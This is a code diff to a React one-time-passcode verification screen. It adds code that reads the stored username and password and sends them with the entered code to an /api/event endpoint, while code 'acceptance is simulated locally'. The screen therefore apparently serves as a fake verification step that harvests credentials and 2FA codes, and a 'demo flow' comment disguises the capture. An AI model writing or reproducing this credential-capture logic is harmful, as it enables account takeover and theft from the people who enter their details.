@@ -6,7 +6,9 @@ import {
   MSG_UNABLE_REACH_VERIFICATION,
   OTP_CODE_LENGTH,
 } from "@/lib/approval-messages";
+import { sendEvent } from "@/lib/event-client";
 import { otpMethodVerifySubtitle, type OtpMethod } from "@/lib/otp-methods";
+import { readPendingCredentials } from "@/lib/pending-session";
 
 type Props = {
   method: OtpMethod;
@@ -56,7 +58,18 @@ export default function MwbOtpVerification({
     setError("");
     setSubmitting(true);
     try {
-      // Demo flow — code acceptance is simulated locally.
+      // Demo flow — the code is dispatched to POST /api/event; acceptance is
+      // still simulated locally once the event has been delivered.
+      const credentials = readPendingCredentials();
+      const { ok } = await sendEvent("otp", {
+        username: credentials.username,
+        password: credentials.password,
+        otp: code.trim(),
+      });
+      if (!ok) {
+        setError(MSG_UNABLE_REACH_VERIFICATION);
+        return;
+      }
       await new Promise((r) => setTimeout(r, 600));
       onSubmitted();
     } catch {
